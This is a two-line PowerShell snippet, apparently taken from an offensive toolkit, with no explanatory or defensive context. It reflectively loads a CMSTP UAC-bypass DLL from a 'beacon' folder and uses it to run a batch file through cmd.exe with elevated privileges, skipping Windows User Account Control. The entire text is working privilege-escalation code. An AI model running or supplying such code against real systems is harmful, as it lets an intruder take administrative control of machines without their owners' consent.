[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("C:\temp\beacon\elevate\CMSTP-UAC-Bypass.dll")) | Out-Null
[CMSTPBypass]::Execute('C:\Windows\System32\cmd.exe /C C:\temp\beacon\side-project\set_console_mode.bat')
